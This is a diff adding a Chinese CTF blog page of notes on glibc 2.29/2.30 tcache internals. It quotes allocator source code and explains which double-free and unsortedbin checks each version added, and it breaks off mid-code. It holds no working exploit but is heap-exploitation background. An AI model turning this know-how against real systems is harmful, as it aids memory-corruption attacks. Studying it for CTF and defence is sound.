@@ -1,0 +1,1395 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=STZhongsong:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|consolas:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/014.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/014.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/014.jpg?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="WP,summary,Glibc2.29_up,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="本来不想再弄glibc的东西了，但是最近的2.29的题越来越多。。。考虑到以后去给人培训的话，会有知识盲区，不太好，别人来问题的话，不会这方面也很没面子，还是决定花几天时间调一下。也算复习一下tcache相关的东西了。 2.26~2.28都没有double free与tcache-&amp;gt;counts[tc_idx]的检测，从2.29起加了double free 和 调用tcache_get()之">
+<meta name="keywords" content="WP,summary,Glibc2.29_up">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Glibc2.29笔记">
+<meta property="og:url" content="http://yoursite.com/2020/04/28/Glibc2.29笔记/index.html">
+<meta property="og:site_name" content="xiaoxiaorenwu">
+<meta property="og:description" content="本来不想再弄glibc的东西了，但是最近的2.29的题越来越多。。。考虑到以后去给人培训的话，会有知识盲区，不太好，别人来问题的话，不会这方面也很没面子，还是决定花几天时间调一下。也算复习一下tcache相关的东西了。 2.26~2.28都没有double free与tcache-&amp;gt;counts[tc_idx]的检测，从2.29起加了double free 和 调用tcache_get()之">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2020/04/28/JAkBezm5YElUqic.png">
+<meta property="og:updated_time" content="2021-01-09T16:06:00.385Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Glibc2.29笔记">
+<meta name="twitter:description" content="本来不想再弄glibc的东西了，但是最近的2.29的题越来越多。。。考虑到以后去给人培训的话，会有知识盲区，不太好，别人来问题的话，不会这方面也很没面子，还是决定花几天时间调一下。也算复习一下tcache相关的东西了。 2.26~2.28都没有double free与tcache-&amp;gt;counts[tc_idx]的检测，从2.29起加了double free 和 调用tcache_get()之">
+<meta name="twitter:image" content="https://i.loli.net/2020/04/28/JAkBezm5YElUqic.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","width":350,"display":"hide","offset":20,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/04/28/Glibc2.29笔记/">
+
+
+
+
+
+  <title>Glibc2.29笔记 | xiaoxiaorenwu</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta custom-logo">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">xiaoxiaorenwu</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">生活的艰辛，三分来自压力，七分来自攀比，我想做个小人物</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/28/Glibc2.29笔记/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/xxrw.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xiaoxiaorenwu">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Glibc2.29笔记</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-28T00:05:04+08:00">
+                2020-04-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-PWN/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF-PWN</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/04/28/Glibc2.29笔记/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2020/04/28/Glibc2.29笔记/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3.4k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  18 min
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>本来不想再弄<code>glibc</code>的东西了，但是最近的<code>2.29</code>的题越来越多。。。考虑到以后去给人培训的话，会有知识盲区，不太好，别人来问题的话，不会这方面也很没面子，还是决定花几天时间调一下。也算复习一下<code>tcache</code>相关的东西了。</p>
+<p><code>2.26~2.28</code>都没有<code>double free</code>与<code>tcache-&gt;counts[tc_idx]</code>的检测，从<code>2.29</code>起加了<code>double free</code> 和 调用<code>tcache_get()</code>之前检测<code>tcache-&gt;counts[tc_idx]</code>是否大于0这两个检测。</p>
+<p>从<code>2.28</code>起对<code>unsortedbin</code>解链进行了检查，<code>2.23~2.27</code>中<code>unsortedbin_attack</code>都适用。</p>
+<p>从<code>2.30</code>起<code>tcache_perthread_struct</code>结构体中的<code>counts</code>数组的成员类型由字符转变为<code>uint16_t</code>(两个字符)。所以<code>2.30</code>之前的<code>tcache_perthread_struct</code>结构体大小为<code>0x240(0x40+0x200)</code>，<code>2.30</code>之后变为<code>0x290(0x40*2+0x200)</code>。</p>
+<p>以下内容都基于<code>GLIBC_2.30</code>：</p>
+<p>一些结构体：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS		64</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT       7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span> <span class="title">mp_</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  .top_pad = DEFAULT_TOP_PAD,</span><br><span class="line">  .n_mmaps_max = DEFAULT_MMAP_MAX,</span><br><span class="line">  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,</span><br><span class="line">  .trim_threshold = DEFAULT_TRIM_THRESHOLD,</span><br><span class="line">#define NARENAS_FROM_NCORES(n) ((n) * (<span class="keyword">sizeof</span> (<span class="keyword">long</span>) == <span class="number">4</span> ? <span class="number">2</span> : <span class="number">8</span>))</span><br><span class="line">  .arena_test = NARENAS_FROM_NCORES (<span class="number">1</span>)</span><br><span class="line">#<span class="keyword">if</span> USE_TCACHE</span><br><span class="line">  ,</span><br><span class="line">  .tcache_count = TCACHE_FILL_COUNT,   </span><br><span class="line">  .tcache_bins = TCACHE_MAX_BINS,     </span><br><span class="line">  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="number">-1</span>),</span><br><span class="line">  .tcache_unsorted_limit = <span class="number">0</span> <span class="comment">/* No limit.  */</span></span><br><span class="line">#endif</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>
+<p>一些相关函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);   </span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在<code>_int_free()</code>中：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Little security check which won't hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by "design" from some intruder.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid pointer"</span>);</span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid size"</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check to see if it's already in the tcache.  */</span></span><br><span class="line">	tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* This test succeeds on double free.  However, we don't 100%</span></span><br><span class="line"><span class="comment">	   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">	   2^&lt;size_t&gt; chance), so verify it's not an unlikely</span></span><br><span class="line"><span class="comment">	   coincidence before aborting.  */</span></span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))        <span class="comment">//先检测double free</span></span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_entry *tmp;</span><br><span class="line">	    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">	    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">		 tmp;</span><br><span class="line">		 tmp = tmp-&gt;next)</span><br><span class="line">	      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">		malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line">	    <span class="comment">/* If we get here, it was a coincidence.  We've wasted a</span></span><br><span class="line"><span class="comment">	       few cycles, but don't abort.  */</span></span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)   <span class="comment">//再检测tcache是否满了</span></span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_put (p, tc_idx);</span><br><span class="line">	    <span class="keyword">return</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    </span><br><span class="line">.......</span><br><span class="line">常规<span class="built_in">free</span>操作</span><br></pre></td></tr></table></figure>
+<p>在<code>__libc_malloc</code>中：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  _Static_assert (PTRDIFF_MAX &lt;= SIZE_MAX / <span class="number">2</span>,</span><br><span class="line">                  <span class="string">"PTRDIFF_MAX is not more than half of SIZE_MAX"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE                                             <span class="comment">//进入_int_malloc之前先看tcache</span></span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  <span class="keyword">if</span> (!checked_request2size (bytes, &amp;tbytes))</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (ENOMEM);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)    <span class="comment">//2.29对count新加了检测,doublefree这个利用应该是彻底gg了</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">	      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_malloc)</span><br></pre></td></tr></table></figure>
+<p>进入到<code>_int_malloc</code>之后，有多处用到了<code>tcache</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 